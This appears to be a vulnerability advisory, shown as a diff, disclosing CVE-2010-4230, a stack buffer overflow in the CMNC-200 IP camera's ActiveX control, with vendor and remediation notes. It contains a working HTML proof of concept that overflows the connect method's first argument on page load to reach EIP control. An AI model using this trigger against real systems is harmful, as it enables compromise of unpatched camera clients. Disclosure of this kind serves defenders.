@@ -1,0 +1,35 @@
+Finding 1: Buffer Overflow in ActiveX Control
+CVE: CVE-2010-4230
+
+The CMNC-200 IP Camera ActiveX control identified by
+CLSID {DD01C8CA-5DA0-4B01-9603-B7194E561D32} is vulnerable
+to a stack overflow on the first argument of the connect method.
+The vulnerability can be used to set the EIP register,
+allowing a reliable exploitation.
+
+The example code below triggers the vulnerability.
+
+<html>
+<head><title>IPcam POC</title>
+<script>
+function Check(){
+    var bf1 = 'A';
+    while (bf1.length <= 6144) bf1 = bf1 + 'A';
+    obj.connect(bf1,"BBBB","CCCC");
+}
+</script>
+</head>
+<body onload=" Check();">
+<object classid="clsid:DD01C8CA-5DA0-4B01-9603-B7194E561D32"
+id="obj">
+</object>
+</html></body>
+
+Vendor Response:
+No response received.
+
+Remediation Steps:
+No patch currently exists for this issue. To limit exposure,
+network access to these devices should be limited to authorized
+personnel through the use of Access Control Lists and proper
+network segmentation.
